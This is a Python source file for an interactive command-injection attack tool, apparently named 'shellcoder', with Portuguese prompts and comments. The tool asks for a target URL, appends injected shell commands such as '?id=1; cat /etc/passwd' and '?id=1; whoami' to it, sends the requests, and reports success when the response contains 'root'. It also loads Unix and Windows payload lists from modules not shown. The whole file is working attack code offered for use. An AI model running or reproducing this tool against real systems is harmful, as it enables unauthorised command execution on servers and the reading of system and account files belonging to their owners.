#shellcoder
import sys
import requests
from __designer__ import __choices__
from __payload__ import __payloadunix__
from __payload__ import __payloadWin__
__choices__()
def realizar_ataque(url, payload):
    try:
        # Sanitiza a URL e o payload
        url = url.strip().rstrip('/')  # Remove espaços e barra do final
        payload = payload.strip()  # Remove espaços

        # Verifica se a URL e o payload não estão vazios
        if not url or not payload:
            print(" ⚠️ \33[1m\33[91mURL OU PAYLOAD INVALIDO.")
            return
        # Realiza um ataque de injeção de comando
        full_url = f"{url}{payload[1:-1]}"  # Concatena corretamente a URL e o payload
        print(f" \33[1m\33[92mREQUISIÇÃO EM: {full_url}")  # Debug: imprime a URL completa
        response = requests.get(full_url)

        print(f"\nStatus Code: {response.status_code}")
        print(" \33[1m\33[95mRESPOSTA DO SERVIDOR:")

        # Exibe os primeiros 200 caracteres da resposta
        resposta_texto = response.text[:200]
        print(resposta_texto)

        # Sistema de alerta para possíveis vulnerabilidades
        if response.status_code == 200 and "root" in resposta_texto.lower():
            print(" ⚠️ \33[1m\33[95mAVISO: POSSÍVEL VULNERABIBLIDADE ENCONTRADA, CONTÉM 'root'.")
        elif "error" in resposta_texto.lower():
            print(" ⚠️ \33[1m\33[91mERRO: A RESPOSTA CONTÉM ERROS.")
        elif response.status_code != 200:
            print(" ❌ \33[1m\33[91mERRO: RESPOSTA DO SERVIDOR:")
        else:
            print(" ✅ \33[1m\33[96mNENHUMA VULNERABIBLIDADE ENCONTRADA.")

    except requests.exceptions.RequestException as e:
        print(f" \33[1m\33[91mERRO AO REALIZAR REQUISIÇÕES {e}")

def mostrar_comandos():
    comandos = [
        "?id=1; ls",
        "?id=1; cat /etc/passwd",
        "?id=1; uname -a",
        "?id=1; whoami",
        "?id=1; ping -c 4 127.0.0.1"
    ]
    print("\n  \33[1m\33[97mLISTA DE COMANDOS PARA TESTAR:")
    for comando in comandos:
        print(f"\33[1m\33[92m   $ {comando}")
    return comandos

def mostrar_payloads():
    payloads = __payloadunix__
    print("\n  \33[1m\33[97mLista de Payloads Disponíveis:")
    for payload in payloads:
        print(f"\33[1m\33[92m   $ {payload}")
    return payloads

def mostrar_payloadswin():
    payloads = __payloadWin__
    print("\n  \33[1m\33[97mLista de Payloads Disponíveis:")
    for payload in payloads:
        print(f"\33[1m\33[92m   $ {payload}")
    return payloads

def mostrar_ajuda():
    ajuda = {
        "add-command 'comando'": "Adiciona um comando à lista de testes.",
        "add-payload 'payload'": "Adiciona um payload à lista de testes.",
        "list-payloads": "Mostra a lista de payloads disponíveis para uso.",
        "list-payloads unix": "Mostra a lista de payloads unix disponíveis para uso.",
        "list-payloads win": "Mostra a lista de payloads windows disponíveis para uso.",
        "start": "Inicia os testes com os comandos e payloads configurados.",
        "help": "Mostra como usar cada comando."
    }
    print("\n \33[1m\33[92m AJUDA:")
    for comando, descricao in ajuda.items():
        print(f"   \33[1m\33[92m{comando}:\33[97m {descricao}\33[0m")

def main():
    # Verifica se a URL foi fornecida como argumento
    #if len(sys.argv) != 2:
    #    print(" \33[1m\33[95mUSE: python __main__.py <URL>")
    #    sys.exit(1)

    url = input ("   DEGITE A URL DO ALVO: ")
    print(f" \33[1m\33[95mURL CONECTADO: {url}")
    print(" \33[1m\33[95mhelp - AJUDA | exit - SAIR..\33[0m")

    comandos_configurados = []
    payload_configurado = None

    while True:
        # Recebe o comando do usuário
        code = input("\n \33[1m\33[97m# \33[92m")

        if code.lower() == 'exit':
            print(" \33[91mSAINDO...\33[1m")
            break
        elif code.lower() == 'help':
            mostrar_ajuda()
        elif code.lower() == 'list-commands':
            mostrar_comandos()
        elif code.lower() == 'list-payloads unix':
            mostrar_payloads()
        elif code.lower() == 'list-payloads win':
            mostrar_payloadswin()
        elif(code.lower() == "clear"):
            __choices__()
        elif code.lower().startswith('add-command '):
            comando = code[12:].strip().strip('"')  # Captura o comando sem aspas
            if comando:
                comandos_configurados.append(comando)
                print(f"  \33[1m\33[95mCOMANDO: \33[92m{comando}\33[95m CONFIGIURADO PARA ATTACK.")
            else:
                print(" \33[1m\33[91m⚠️ COMANDO INVALIDO. Certifique-se de que está entre aspas.")
        elif code.lower().startswith('add-payload '):
            payload = code[12:].strip().strip('"')  # Captura o payload sem aspas
            if payload:
                payload_configurado = payload
                print(f"  \33[1m\33[95mPAYLOAD DEFINIDO: \33[92m{payload}\33[90m")
            else:
                print(" ⚠️ \33[1m\33[91mPAYLOAD INVALIDO. Certifique-se de que está entre aspas.")
        elif code.lower() == 'start':
            if not comandos_configurados and not payload_configurado:
                print(" ⚠️ \33[1m\33[91mNENHUM COMANDO OU PAYLOAD DEFINIDO.")
            else:
                print(" \33[1m\33[92mSTART ATTACKS.")
                for comando in comandos_configurados:
                    realizar_ataque(url, comando)
                if payload_configurado:
                    realizar_ataque(url, payload_configurado)
        else:
            print(" ⚠️ \33[1m\33[91mCOMANDO NÃO RECONHECIDO: USER 'help' para visualizar a lista de comandos.")

#if __name__ == "__main__":
#    main()
